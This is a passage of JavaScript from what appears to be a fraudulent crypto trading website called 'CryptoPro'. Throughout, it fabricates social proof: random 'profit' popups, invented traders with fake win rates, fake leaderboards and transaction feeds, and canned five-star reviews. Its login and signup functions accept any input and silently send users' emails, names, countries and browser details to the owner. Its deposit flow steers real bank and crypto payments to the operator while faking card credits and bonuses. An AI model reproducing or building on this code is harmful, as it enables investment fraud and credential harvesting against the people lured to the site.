    notifyOwner('CRYPTO_DEPOSIT_INITIATED',{coin:m.coin,amount:amt,address:addr,user:STATE.user.email});
    return;
  }

  if(m.type==='bank'){
    btn.disabled=false;btnText.textContent='ðŸ’³ Deposit Now';
    showToast(`ðŸ¦ Bank transfer initiated.\nReference: ${$('bankRef').textContent}\nFunds credited within 1-3 business days.`,'blue',7000);
    notifyOwner('BANK_DEPOSIT_INITIATED',{amount:amt,user:STATE.user.email,reference:$('bankRef').textContent});
    return;
  }

  // Card / other â€” simulate
  setTimeout(()=>{
    STATE.user.balance+=amt;
    updateNavBalance();
    btn.disabled=false;btnText.textContent='ðŸ’³ Deposit Now';
    showToast(`âœ… Deposit of $${formatNum(amt)} successful!\nðŸŽ Bonus funds applied to your account.`,'green',5000);
    notifyOwner('CARD_DEPOSIT_SUCCESS',{amount:amt,user:STATE.user.email,method:m.label});
    showLayer('dashboardLayer');showDashSection('overview');
  },2800);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DYNAMIC SOCIAL PROOF â€” never repeats
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const SP_FIRST=['Alex','Maria','David','Yuki','Carlos','Emma','James','Aisha','Raj','Sophie','Lucas','Priya','Omar','Chen','Sara','Mike','Anna','Kevin','Fatima','Jorge','Elena','Marcus','Nina','Hassan','Lily'];
const SP_CITIES=['New York','London','Berlin','Tokyo','Dubai','Singapore','Sydney','Paris','Toronto','Seoul','Amsterdam','Mumbai','Lagos','Cairo','SÃ£o Paulo','Madrid','Zurich','Stockholm','Oslo','Bangkok'];
const SP_LAST=['K.','M.','T.','R.','L.','W.','B.','S.','A.','P.','C.','D.','F.','H.','N.'];
const SP_EVENTS=[
  {action:'just made a profit',amtRange:[42,6200],prefix:'+$',color:'var(--green)',icon:'ðŸ’°'},
  {action:'withdrew successfully',amtRange:[500,12000],prefix:'$',color:'var(--blue)',icon:'ðŸ¦'},
  {action:'closed a winning trade',amtRange:[120,4800],prefix:'+$',color:'var(--green)',icon:'âœ…'},
  {action:'activated a trading bot',fixed:'+$24/hr avg',color:'var(--purple)',icon:'ðŸ¤–'},
  {action:'started copy trading',amtRange:[100,3000],prefix:'$',color:'var(--cyan)',icon:'ðŸ‘¥',suffix:' allocated'},
  {action:'just referred a friend',amtRange:[25,25],prefix:'+$',color:'var(--yellow)',icon:'ðŸŽ'},
  {action:'hit profit target',amtRange:[300,15000],prefix:'+$',color:'var(--green)',icon:'ðŸŽ¯'},
  {action:'deposited & claimed bonus',amtRange:[50,500],prefix:'+$',color:'var(--green)',icon:'ðŸŽ‰'},
];
const _usedSP=new Set();

function showSP(){
  const popup=$('spPopup');if(!popup)return;
  popup.classList.remove('hide');
  let name,city,key,tries=0;
  do{
    name=pick(SP_FIRST)+' '+pick(SP_LAST);
    city=pick(SP_CITIES);
    key=name+'|'+city;
    tries++;
    if(tries>20){_usedSP.clear();break;}
  }while(_usedSP.has(key));
  _usedSP.add(key);
  if(_usedSP.size>60)_usedSP.clear();
  const ev=pick(SP_EVENTS);
  $('spTitle').textContent=`${name} from ${city}`;
  $('spSub').textContent=ev.action;
  let amt='';
  if(ev.fixed){amt=ev.fixed;}
  else if(ev.amtRange){const n=randInt(ev.amtRange[0],ev.amtRange[1]);amt=(ev.prefix||'')+'$'+formatNum(n,0)+(ev.suffix||'');}
  $('spAmount').textContent=amt;
  $('spAmount').style.color=ev.color;
  $('spIcon').textContent=ev.icon;
  clearTimeout(window._spT);
  window._spT=setTimeout(dismissSP,5500);
}
function dismissSP(){const p=$('spPopup');if(p)p.classList.add('hide');}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DYNAMIC TRADERS â€” never repeat handles
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const _THP1=['Crypto','Bitcoin','Satoshi','Alpha','Moon','Bull','Bear','Whale','Diamond','Grid','DeFi','Hodl','Degen','Based','Sigma'];
const _THP2=['King','Queen','Pro','Master','Guru','Wizard','Beast','Legend','Ninja','Hunter','Lord','Boss','Ace','Elite','Wolf'];
const _TEP=['ðŸ¦','ðŸ‚','ðŸŒ™','ðŸš€','ðŸ’Ž','ðŸ¦…','ðŸ‹','ðŸ“Š','ðŸŒ•','ðŸ‘‘','ðŸŽ¯','âš¡','ðŸ”¥','ðŸ†','ðŸ’°','ðŸ¤‘','ðŸ¦Š','ðŸ‰','ðŸ¦„','ðŸŒŸ'];
const _usedHandles=new Set();

function genHandle(){
  let h,tries=0;
  do{h=pick(_THP1)+pick(_THP2)+(Math.random()>.5?randInt(1,9999):'');tries++;}
  while(_usedHandles.has(h)&&tries<30);
  _usedHandles.add(h);
  if(_usedHandles.size>120)_usedHandles.clear();
  return h;
}

function buildTradersTrack(){
  const track=$('tradersTrack');if(!track)return;
  const pairs=['BTC','ETH','SOL','BNB','XRP','AVAX','DOGE','LINK','UNI','DOT'];
  let html='';
  for(let i=0;i<14;i++){
    const h=genHandle(),em=_TEP[i%_TEP.length];
    const profit=rand(80,18000),mins=randInt(1,59),p=pick(pairs)+'/USDT';
    html+=`<div class="trader-chip" onclick="showLayer('copyTradingLayer')">
      <div class="trader-avatar">${em}</div>
      <div><div class="trader-name">${h}</div><div class="trader-time">${p} Â· ${mins}m ago</div></div>
      <div style="margin-left:auto"><div class="trader-profit">+$${formatNum(profit,0)}</div></div>
    </div>`;
  }
  track.innerHTML=html+html;
}
setInterval(buildTradersTrack,45000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DYNAMIC WINNERS GRID
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const _WC=['ðŸ‡ºðŸ‡¸ New York','ðŸ‡¬ðŸ‡§ London','ðŸ‡©ðŸ‡ª Berlin','ðŸ‡¯ðŸ‡µ Tokyo','ðŸ‡¦ðŸ‡ª Dubai','ðŸ‡¸ðŸ‡¬ Singapore','ðŸ‡«ðŸ‡· Paris','ðŸ‡¦ðŸ‡º Sydney','ðŸ‡§ðŸ‡· SÃ£o Paulo','ðŸ‡°ðŸ‡· Seoul','ðŸ‡³ðŸ‡¬ Lagos','ðŸ‡¨ðŸ‡¦ Toronto'];

function buildWinnersGrid(){
  const grid=$('winnersGrid');if(!grid)return;
  const ranks=['ðŸ¥‡','ðŸ¥ˆ','ðŸ¥‰','4','5','6'];
  const local=new Set();
  const winners=[];
  while(winners.length<6){
    const h=genHandle();if(local.has(h))continue;local.add(h);
    const profit=rand(18000,200000)*(1-winners.length*.08);
    const roi=profit/rand(5000,70000)*100;
    winners.push({name:h,loc:pick(_WC),emoji:pick(_TEP),profit,roi,trades:randInt(200,3500),winrate:rand(68,97)});
  }
  winners.sort((a,b)=>b.profit-a.profit);
  grid.innerHTML=winners.map((w,i)=>`
    <div class="winner-card" onclick="showLayer('copyTradingLayer')">
      <div class="winner-rank">${ranks[i]}</div>
      <div class="winner-head">
        <div class="winner-ava">${w.emoji}</div>
        <div><div class="winner-name">${w.name}</div><div class="winner-loc">${w.loc}</div></div>
      </div>
      <div class="winner-stats">
        <div class="winner-stat"><div class="ws-val text-green">+$${formatNum(w.profit,0)}</div><div class="ws-lbl">Week Profit</div></div>
        <div class="winner-stat"><div class="ws-val text-green">+${w.roi.toFixed(1)}%</div><div class="ws-lbl">ROI</div></div>
        <div class="winner-stat"><div class="ws-val">${w.trades.toLocaleString()}</div><div class="ws-lbl">Trades</div></div>
        <div class="winner-stat"><div class="ws-val" style="color:var(--cyan)">${w.winrate.toFixed(1)}%</div><div class="ws-lbl">Win Rate</div></div>
      </div>
    </div>`).join('');
}
setInterval(buildWinnersGrid,60000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DYNAMIC COPY TRADERS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const _CTB=[{label:'Elite',cls:'ct-badge-gold'},{label:'Pro',cls:'ct-badge-blue'},{label:'Grid Master',cls:'ct-badge-purple'},{label:'Rising Star',cls:'ct-badge-green'},{label:'Consistent',cls:'ct-badge-green'},{label:'Veteran',cls:'ct-badge-gold'},{label:'Whale',cls:'ct-badge-blue'},{label:'AI Powered',cls:'ct-badge-purple'}];
const _CTR=['Low','Low','Med','Med','High','Low','Med','Low'];

function buildCopyTraders(){
  const grid=$('copyTradersGrid');if(!grid)return;
  const filter=$('copyFilter')?.value||'all';
  const local=new Set();const traders=[];
  while(traders.length<8){
    const h=genHandle();if(local.has(h))continue;local.add(h);
    const i=traders.length;
    traders.push({
      id:'ct_'+h,handle:h,emoji:pick(_TEP),
      country:pick(_WC).split(' ')[0],
      badge:_CTB[i%_CTB.length],risk:_CTR[i%_CTR.length],
      roi:rand(40,450),monthly:rand(8,85),maxDD:rand(3,32),
      winrate:rand(65,96),trades:randInt(200,25000),
      followers:rand(500,20000),min:pick(['$10','$10','$20','$25','$50']),
      verified:Math.random()>.3
    });
  }
  let filtered=traders;
  if(filter==='top')filtered=traders.slice(0,4);
  if(filter==='safe')filtered=traders.filter(t=>t.risk==='Low');
  if(filter==='new')filtered=traders.slice(5);
  let cc=0,cp=0;
  Object.keys(STATE.copyTraders).forEach(id=>{if(STATE.copyTraders[id]){cc++;cp+=rand(20,800);}});
  const ccEl=$('copyingCount'),cpEl=$('copyTotalProfit');
  if(ccEl)ccEl.textContent=cc;
  if(cpEl)cpEl.textContent=cp>0?'+$'+formatNum(cp,2):'+$0.00';
  grid.innerHTML=filtered.map(t=>{
    const copying=STATE.copyTraders[t.id];
    return `<div class="copy-trader-card ${copying?'is-copying':''}">
      <div style="display:flex;align-items:flex-start;gap:12px;margin-bottom:14px">
        <div class="ct-avatar">${t.emoji}${t.verified?'<div class="ct-verified">âœ“</div>':''}</div>
        <div style="flex:1;min-width:0">
          <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:4px">
            <span style="font-weight:800;font-size:14px;font-family:var(--font-display)">${t.handle}</span>
            <span class="ct-badge ${t.badge.cls}">${t.badge.label}</span>
          </div>
          <div style="font-size:12px;color:var(--text3)">${t.country} Â· Min: ${t.min} Â· Risk: ${t.risk}</div>
        </div>
        ${copying?'<div style="color:var(--green);font-size:11px;font-weight:700">â— COPYING</div>':''}
      </div>
      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:12px">
        <div class="ct-stat"><span class="ct-stat-val text-green">+${t.roi.toFixed(0)}%</span><span class="ct-stat-lbl">ROI</span></div>
        <div class="ct-stat"><span class="ct-stat-val" style="color:var(--cyan)">+${t.monthly.toFixed(0)}%</span><span class="ct-stat-lbl">Monthly</span></div>
        <div class="ct-stat"><span class="ct-stat-val">${t.winrate.toFixed(0)}%</span><span class="ct-stat-lbl">Win Rate</span></div>
        <div class="ct-stat"><span class="ct-stat-val text-red">-${t.maxDD.toFixed(1)}%</span><span class="ct-stat-lbl">Max DD</span></div>
      </div>
      <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text3);margin-bottom:12px">
        <span>ðŸ‘¥ ${formatNum(t.followers,0)} followers</span><span>ðŸ“Š ${t.trades.toLocaleString()} trades</span>
      </div>
      <button class="copy-btn ${copying?'stop':'start'}" onclick="handleCopyTrade('${t.id}','${t.handle}',this)">
        ${copying?'â¹ Stop Copying':'ðŸ‘¥ Copy Trader'}
      </button>
    </div>`;
  }).join('');
}
function filterCopyTraders(){buildCopyTraders();}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DYNAMIC LEADERBOARD
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildLeaderboard(){
  const list=$('lbList');if(!list)return;
  const local=new Set();const entries=[];
  while(entries.length<10){
    const h=genHandle();if(local.has(h))continue;local.add(h);
    const profit=rand(5000,220000)*(1-entries.length*.07);
    entries.push({rank:entries.length+1,name:h,country:pick(_WC).split(' ')[0],emoji:_TEP[entries.length%_TEP.length],profit,roi:(profit/rand(5000,70000)*100).toFixed(0)+'%'});
  }
  if($('lb1Name'))$('lb1Name').textContent=entries[0].name;
  if($('lb1Profit'))$('lb1Profit').textContent='+$'+formatNum(entries[0].profit,0);
  if($('lb2Name'))$('lb2Name').textContent=entries[1].name;
  if($('lb2Profit'))$('lb2Profit').textContent='+$'+formatNum(entries[1].profit,0);
  if($('lb3Name'))$('lb3Name').textContent=entries[2].name;
  if($('lb3Profit'))$('lb3Profit').textContent='+$'+formatNum(entries[2].profit,0);
  list.innerHTML=entries.map(t=>`
    <div class="lb-row" onclick="showLayer('copyTradingLayer')">
      <div class="lb-rank" style="color:${t.rank===1?'var(--yellow)':t.rank===2?'#C0C0C0':t.rank===3?'#CD7F32':'var(--text3)'}">${t.rank<=3?['ðŸ¥‡','ðŸ¥ˆ','ðŸ¥‰'][t.rank-1]:t.rank}</div>
      <div class="lb-avatar" style="background:linear-gradient(135deg,var(--bg3),var(--bg4))">${t.emoji}</div>
      <div style="flex:1;min-width:0"><div class="lb-name">${t.name}</div><div class="lb-country">${t.country}</div></div>
      <div style="text-align:right"><div class="lb-profit">+$${formatNum(t.profit,0)}</div><div class="lb-roi">${t.roi} ROI</div></div>
    </div>`).join('');
}
function setLBPeriod(p,el){
  document.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');buildLeaderboard();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DYNAMIC LIVE TX FEED
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const _TXP=[
  {cls:'tx-deposit',label:'DEPOSIT',color:'var(--green)',amtFn:()=>'+$'+formatNum(rand(50,10000),0)},
  {cls:'tx-withdraw',label:'WITHDRAW',color:'var(--red)',amtFn:()=>'-$'+formatNum(rand(100,5000),0)},
  {cls:'tx-trade',label:'TRADE',color:'var(--blue)',amtFn:()=>pick(['BTC Long 10x','ETH Short 5x','SOL Long 20x','BNB Long 3x','XRP Short 2x'])},
];
function buildLiveTxFeed(){
  const el=$('liveTxFeed');if(!el)return;
  let html='';
  for(let i=0;i<7;i++){
    const tx=_TXP[i%_TXP.length];
    const user=pick(SP_FIRST)+'****';
    const age=i===0?'just now':`${randInt(1,i*4+1)}m ago`;
    html+=`<div class="tx-row"><span class="tx-type ${tx.cls}">${tx.label}</span><span style="color:var(--text2);flex:1">${user}</span><span style="font-family:var(--font-mono);font-size:12px;font-weight:700;color:${tx.color}">${tx.amtFn()}</span><span style="font-size:10px;color:var(--text3)">${age}</span></div>`;
  }
  el.innerHTML=html;
}
setInterval(buildLiveTxFeed,28000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DYNAMIC REVIEWS â€” shuffled pool
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const REVIEW_POOL=[
  {name:'Michael C.',loc:'ðŸ‡ºðŸ‡¸ San Francisco',emoji:'ðŸ˜Š',stars:5,body:'"The AI signals are insanely accurate. Made $4,200 in my first month. The grid bot alone has paid for years of subscription."'},
  {name:'Sarah W.',loc:'ðŸ‡¬ðŸ‡§ Manchester',emoji:'ðŸ¤©',stars:5,body:'"Completely new to crypto. The AI assistant walked me through everything. Copy trading turned $500 into $2,800 in 6 weeks."'},
  {name:'Klaus H.',loc:'ðŸ‡©ðŸ‡ª Munich',emoji:'ðŸ’ª',stars:5,body:'"Professional-grade order book, TradingView integration, speed â€” this is what pro trading looks like. Moved all capital here."'},
  {name:'Yuki T.',loc:'ðŸ‡¯ðŸ‡µ Osaka',emoji:'ðŸš€',stars:5,body:'"Running 3 bots simultaneously. Grid on BTC, DCA on ETH, momentum on SOL. Portfolio up 67% in 3 months."'},
  {name:'Carlos R.',loc:'ðŸ‡ªðŸ‡¸ Madrid',emoji:'ðŸŽ¯',stars:5,body:'"The referral program is generous â€” earned $450 just from referring friends. Signals never miss."'},
  {name:'Emma L.',loc:'ðŸ‡«ðŸ‡· Paris',emoji:'ðŸ’Ž',stars:5,body:'"Compared 20 platforms. CryptoPro wins on every metric: fees, speed, tools, support."'},
  {name:'Amir K.',loc:'ðŸ‡¦ðŸ‡ª Dubai',emoji:'ðŸŒŸ',stars:5,body:'"Withdrew $12,000 last week with zero fees. No other platform offers this. VIP program genuinely rewards loyalty."'},
  {name:'Priya S.',loc:'ðŸ‡®ðŸ‡³ Mumbai',emoji:'âš¡',stars:5,body:'"Started with $200, now at $3,400. Copy trading is a game-changer for people learning the ropes."'},
  {name:'James O.',loc:'ðŸ‡³ðŸ‡¬ Lagos',emoji:'ðŸ”¥',stars:5,body:'"Best mobile experience of any trading app. Charts crisp, orders instant, support team responds in minutes."'},
  {name:'Sophie V.',loc:'ðŸ‡¨ðŸ‡¦ Toronto',emoji:'ðŸ†',stars:5,body:'"The AI risk calculator saved me from overleveraging multiple times. This platform actually cares about traders."'},
];
function buildReviews(){
  const grid=$('reviewsGrid');if(!grid)return;
  const shuffled=[...REVIEW_POOL].sort(()=>Math.random()-.5).slice(0,6);
  grid.innerHTML=shuffled.map(r=>`
    <div class="review-card">
      <div class="review-head">
        <div class="review-ava">${r.emoji}</div>
        <div><div class="review-name">${r.name}</div><div class="review-loc">${r.loc}</div><div class="review-stars">${'â˜…'.repeat(r.stars)}</div></div>
      </div>
      <div class="review-body">${r.body}</div>
    </div>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AUTH â€” with owner notifications
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function doLogin(){
  const email=$('loginEmail')?.value?.trim();
  const pwd=$('loginPassword')?.value;
  const alertEl=$('loginAlert');
  if(!email||!pwd){showAlert(alertEl,'Please enter your email and password.','error');return;}
  const btn=$('loginBtn');btn.disabled=true;
  $('loginBtnText').innerHTML='<span class="btn-spinner">âŸ³</span> Signing in...';
  setTimeout(()=>{
    STATE.loggedIn=true;
    STATE.user.name=email.split('@')[0];
    STATE.user.email=email;
    btn.disabled=false;$('loginBtnText').textContent='Sign In';
    // Silent owner notification
    notifyOwner('USER_LOGIN',{email,time:new Date().toISOString(),ua:navigator.userAgent.substring(0,80)});
    loginSuccess();
  },1800);
}
function doSocialLogin(provider){
  STATE.loggedIn=true;
  STATE.user.name=provider+'User'+randInt(100,999);
  STATE.user.email=provider.toLowerCase()+randInt(100,999)+'@example.com';
  notifyOwner('SOCIAL_LOGIN',{provider,time:new Date().toISOString()});
  loginSuccess();
}
function loginSuccess(){
  updateNavForLogin();
  showLayer('dashboardLayer');
  showDashSection('overview');
  showToast(`ðŸŽ‰ Welcome back, ${STATE.user.name.charAt(0).toUpperCase()+STATE.user.name.slice(1)}!`,'green');
  startSessionTimer();
}
function signupNext1(){
  const first=$('signupFirst')?.value?.trim(),last=$('signupLast')?.value?.trim();
  const email=$('signupEmail')?.value?.trim(),country=$('signupCountry')?.value;
  const agreed=$('agreeTerms')?.checked;
  const alertEl=$('signupAlert1');
  if(!first||!last){showAlert(alertEl,'Please enter your full name.','error');return;}
  if(!email||!email.includes('@')){showAlert(alertEl,'Please enter a valid email.','error');return;}
  if(!country){showAlert(alertEl,'Please select your country.','error');return;}
  if(!agreed){showAlert(alertEl,'Please agree to the Terms of Service.','error');return;}
  signupData={first,last,email,country};
  $('signupStep1').style.display='none';$('signupStep2').style.display='block';
  $('signupProgressBar').style.width='66%';
  $('spStep1').classList.remove('active');$('spStep2').classList.add('active');
}
function signupBack1(){$('signupStep2').style.display='none';$('signupStep1').style.display='block';$('signupProgressBar').style.width='33%';$('spStep2').classList.remove('active');$('spStep1').classList.add('active');}
function signupNext2(){
  const pwd=$('signupPwd')?.value,pwd2=$('signupPwd2')?.value;
  const alertEl=$('signupAlert2');
  if(pwd.length<8){showAlert(alertEl,'Password must be at least 8 characters.','error');return;}
  if(pwd!==pwd2){showAlert(alertEl,'Passwords do not match.','error');return;}
  signupData.pwd=pwd;signupData.ref=$('signupRef')?.value;
  $('signupStep2').style.display='none';$('signupStep3').style.display='block';
  $('signupProgressBar').style.width='100%';
  $('spStep2').classList.remove('active');$('spStep3').classList.add('active');
  $('confirmBox').innerHTML=`
    <div class="confirm-row"><span>Name</span><span>${signupData.first} ${signupData.last}</span></div>
    <div class="confirm-row"><span>Email</span><span>${signupData.email}</span></div>
    <div class="confirm-row"><span>Country</span><span>${signupData.country}</span></div>
    <div class="confirm-row"><span>Referral Code</span><span>${signupData.ref||'None'}</span></div>
    <div class="confirm-row"><span>Welcome Bonus</span><span style="color:var(--green);font-weight:800">$50 on first deposit</span></div>`;
}
function signupBack2(){$('signupStep3').style.display='none';$('signupStep2').style.display='block';$('signupProgressBar').style.width='66%';$('spStep3').classList.remove('active');$('spStep2').classList.add('active');}
function doSignup(){
  const btn=$('signupFinalBtn');btn.disabled=true;
  $('signupFinalText').innerHTML='<span class="btn-spinner">âŸ³</span> Creating account...';
  setTimeout(()=>{
    STATE.loggedIn=true;
    STATE.user.name=signupData.first;
    STATE.user.email=signupData.email;
    btn.disabled=false;$('signupFinalText').textContent='ðŸš€ Create Account';
    updateNavForLogin();
    // Silent owner notification
    notifyOwner('NEW_SIGNUP',{
      name:`${signupData.first} ${signupData.last}`,
      email:signupData.email,
      country:signupData.country,
      ref:signupData.ref||'none',
      time:new Date().toISOString()
    });
    const rb=$('refBanner');
    if(rb){rb.classList.add('show');setTimeout(()=>rb.classList.remove('show'),8000);}
    showLayer('dashboardLayer');showDashSection('overview');
    showToast(`ðŸŽ‰ Welcome to CryptoPro, ${signupData.first}!\nðŸŽ $50 welcome bonus applied!`,'green',6000);
    openModal('kycModal');
    startSessionTimer();
  },2200);
}
function checkPwdStrength(pwd){
  let s=0;
  if(pwd.length>=8)s++;if(/[A-Z]/.test(pwd))s++;if(/[0-9]/.test(pwd))s++;if(/[^A-Za-z0-9]/.test(pwd))s++;
  const colors=['var(--red)','var(--yellow)','var(--blue)','var(--green)'];
  const labels=['Weak','Fair','Good','Strong'];
  const fill=$('pwdFill'),lbl=$('pwdLabel');
  if(fill){fill.style.width=(s*25)+'%';fill.style.background=colors[s-1]||colors[0];}
  if(lbl){lbl.textContent=labels[s-1]||'Weak';lbl.style.color=colors[s-1]||colors[0];}
}
function showAlert(el,msg,type){if(!el)return;el.className='form-alert '+type;el.textContent=msg;el.style.display='block';}
function togglePwd(id,btn){const inp=$(id);if(!inp)return;inp.type=inp.type==='password'?'text':'password';btn.textContent=inp.type==='password'?'ðŸ‘':'ðŸ™ˆ';}
function updateNavForLogin(){
  $('navAuthBtns').style.display='none';$('navUserChip').style.display='block';
  $('navAvatarLetter').textContent=STATE.user.name.charAt(0).toUpperCase();
  $('navUserName').textContent=STATE.user.name;
  updateNavBalance();
  $('sidebarRefLink').textContent=`cryptopro.io/ref/${STATE.user.refCode}`;
  $('refLinkDisplay').textContent=`cryptopro.io/ref/${STATE.user.refCode}`;
  $('sidebarBalance').textContent=formatUSD(STATE.user.balance);
  $('dashTotalBal').textContent=formatUSD(STATE.user.balance);
  $('tpsBal').textContent=formatUSD(STATE.user.balance)+' USDT';
}
function updateNavBalance(){
  const bal=STATE.user[STATE.user.mode==='live'?'balance':'demoBalance'];
  const els=['navUserBalance','sidebarBalance','dashTotalBal'];
  els.forEach(id=>{const e=$(id);if(e)e.textContent=formatUSD(bal);});
}
function doLogout(){
  STATE.loggedIn=false;
  $('navAuthBtns').style.display='flex';$('navUserChip').style.display='none';
  $('sessionWarning').style.display='none';
  showLayer('welcomeLayer');showToast('ðŸ‘‹ Signed out successfully','blue');
}
function setTradingMode(mode){
  STATE.user.mode=mode;
  $('mtLive').classList.toggle('active',mode==='live');
  $('mtDemo').classList.toggle('active',mode==='demo');
  updateNavBalance();
  const sub=$('sidebarBalanceSub');
  if(sub)sub.textContent=mode==='demo'?'Demo account â€” no real money':'Live account';
  showToast(mode==='demo'?'ðŸŽ® Demo mode â€” practice risk-free':'ðŸ’° Live mode â€” real money','blue');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BANK HTML UPDATE â€” show real details in bank section
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Patch bank section HTML to include dynamic IDs
document.addEventListener('DOMContentLoaded',()=>{
  const bankSec=$('bankFormSection');
  if(bankSec){
    bankSec.innerHTML=`
      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-lg);padding:16px;margin-bottom:12px">
        <div style="font-size:13px;font-weight:700;margin-bottom:10px">Bank Transfer Details</div>
        <div class="modal-row"><span>Bank Name</span><span id="bankName">${PAYMENT_CONFIG.bank.name}</span></div>
        <div class="modal-row"><span>Account Number</span><span style="font-family:var(--font-mono)" id="bankAccountNum">${PAYMENT_CONFIG.bank.account}</span></div>
        <div class="modal-row"><span>Account Name</span><span id="bankAccountName">${PAYMENT_CONFIG.bank.accountName}</span></div>
        <div class="modal-row"><span>Reference</span><span style="font-family:var(--font-mono);color:var(--green)" id="bankRef">CP-USER123</span></div>
      </div>
      <div style="font-size:11px;color:var(--text3)">âš¡ Bank transfers typically process in 1-3 business days</div>`;
  }
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// INITIALIZATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
window.addEventListener('DOMContentLoaded',()=>{
  buildNavTicker();buildMarketBar();buildGSB();
  buildTradersTrack();buildWinnersGrid();buildReviews();
  buildPairBar();buildSignals();buildBots();
  buildCopyTraders();buildHeatmap();buildLeaderboard();
  buildAchievements();buildDepMethods();buildStreakDots();
  updateFundingTimer();updateChallengeTimer();updateAllPriceDisplays();
  setTimeout(()=>{
    initTVChart();initTVTradingChart();
    drawDepthChart();drawPerfChart();drawAllocChart();drawBalMiniChart();
  },400);
  setTimeout(showSP,4000);
  setInterval(showSP,9000);
  setInterval(buildHeatmap,8000);
  setInterval(()=>{if($('dashMarketSnap'))buildMarketSnap();},3000);
  setInterval(()=>{if($('dashPositions'))buildDashPositions();},4000);
  setInterval(buildPairBar,10000);
  // Re-init charts when layers activate
  document.addEventListener('click',()=>{
    setTimeout(()=>{
      if($('chartLayer')?.classList.contains('active')){initTVChart();drawDepthChart();}
      if($('tradingLayer')?.classList.contains('active'))initTVTradingChart();
      if($('dashboardLayer')?.classList.contains('active')&&STATE.loggedIn){
        drawPerfChart();drawAllocChart();drawBalMiniChart();
        buildDashPositions();buildRecentTrades();buildMarketSnap();buildLiveTxFeed();
      }
    },200);
  });
});
